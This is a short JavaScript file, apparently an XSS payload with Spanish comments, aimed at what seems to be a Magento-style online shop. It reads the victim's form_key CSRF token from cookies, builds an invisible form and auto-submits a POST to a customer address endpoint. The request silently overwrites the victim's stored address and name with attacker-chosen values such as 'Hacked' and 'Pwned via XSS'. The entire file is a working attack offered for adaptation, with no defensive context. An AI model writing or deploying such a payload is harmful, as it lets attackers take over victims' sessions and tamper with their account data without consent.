// xss-edit-address.js - Versión actualizada con endpoint correcto + ID

function getCookie(name) {
  let matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([.$?*|{}\\(\\)[\\]\\\\\\/\\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : null;
}

let formKey = getCookie('form_key');

if (formKey) {
  // Crear el formulario invisible
  let form = document.createElement('form');
  form.method = 'POST';
  form.action = '/de/customer/address/formPost/id/2410/';  // <-- Endpoint correcto con ID

  // Helper para agregar campos hidden
  function addField(name, value) {
    let input = document.createElement('input');
    input.type = 'hidden';
    input.name = name;
    input.value = value;
    form.appendChild(input);
  }

  // Campos obligatorios / importantes
  addField('form_key', formKey);

  // Datos que quieres inyectar (cámbialos según necesites)
  addField('prefix', 'Herr');
  addField('firstname', 'Hacked');
  addField('lastname', 'XSS');
  addField('company', 'Pwned via XSS');
  addField('telephone', '+41 666 666 666');

  // Dirección (street puede tener múltiples líneas)
  addField('street[]', 'Calle Inyectada 666');
  addField('street[]', 'Piso Hacker');
  addField('city', 'Ciudad Pwned');
  addField('postcode', '9999');
  addField('country_id', 'CH');

  // Opcionales para que la redirección sea limpia
  addField('success_url', '/de/customer/address/');
  addField('error_url', '/de/customer/address/edit/id/2410/');

  // Enviar automáticamente
  document.body.appendChild(form);
  form.submit();
} else {
  // Debug: si no hay form_key
  console.log('No se encontró form_key en cookies');
}
